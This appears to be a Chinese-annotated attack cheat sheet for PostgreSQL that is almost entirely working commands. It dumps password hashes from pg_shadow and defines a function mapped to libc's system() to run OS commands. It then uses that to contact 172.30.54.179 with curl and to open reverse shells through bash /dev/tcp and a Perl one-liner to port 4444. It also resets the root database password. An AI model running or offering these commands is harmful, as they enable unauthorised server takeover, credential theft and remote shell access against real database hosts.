```sh
postgres=# select version();
postgres=# SHOW is_superuser;
postgres=# select usename, passwd from pg_shadow;
postgres=# SELECT name,setting,source FROM pg_settings WHERE name = 'password_encryption';

# PostgreSQL 8.1 及之前版本执行系统命令可以直接使用 Linux 中的 libc.so.6 文件： 返回值为 0 为成功，其它值为失败。
postgres=# CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
postgres=# select system('curl 172.30.54.179');
postgres=# select system('sh -i >& /dev/tcp/172.30.54.179/4444 0>&1');
## 反弹shell
postgres=# select system('perl -e \'use Socket;$i="172.30.54.179";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');

## 修改 psql中的root 密码
postgres=# ALTER USER root WITH PASSWORD 'new_password';

## 系统上 libc.so.6 文件的路径只能靠试, 通常在以下
### /lib/x86_64-linux-gnu/libc.so.6
### /lib/libc.so.6
### /lib64/libc.so.6
### /usr/lib/x86_64-linux-gnu/libc.so.6
### /usr/lib32/libc.so.6
## 执行命令时当返回值为 0 表示执行成功，其它值则是执行失败。

## 使用环境变量密码登录
export PGPASSWORD=Postgres@123
postgres@web04:$ sudo /usr/local/postgresql/bin/psql
```
